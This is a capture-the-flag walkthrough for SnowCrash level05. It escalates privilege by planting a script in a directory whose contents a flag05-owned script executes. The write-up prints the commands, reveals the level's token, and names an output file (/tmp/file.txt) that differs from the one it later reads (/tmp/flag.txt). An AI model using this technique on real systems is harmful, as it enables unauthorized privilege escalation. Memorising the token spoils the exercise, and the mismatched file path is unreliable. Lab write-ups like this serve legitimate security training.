## step 1

# Initial Information

Logged in as `level05`. Nothing interesting in the home directory:

```
    level05@SnowCrash:~$ ls -la
    total 12
    dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
    -r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
    -r-x------  1 level05 level05  675 Apr  3  2012 .profile
``` 
## Step2
Search for Files Owned by flag05
```
find / -user flag05 2>/dev/null

/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
Check contents of the main one:
```
cat /usr/sbin/openarenaserver
```
Contents:

```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

## step 3

Create a script in /opt/openarenaserver/ that runs getflag.

```
echo -e '#!/bin/bash\ngetflag > /tmp/file.txt' > /opt/openarenaserver/flag.sh
chmod +x /opt/openarenaserver/flag.sh
``` 
Finaly : 

level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/opt/openarenaserver$ 



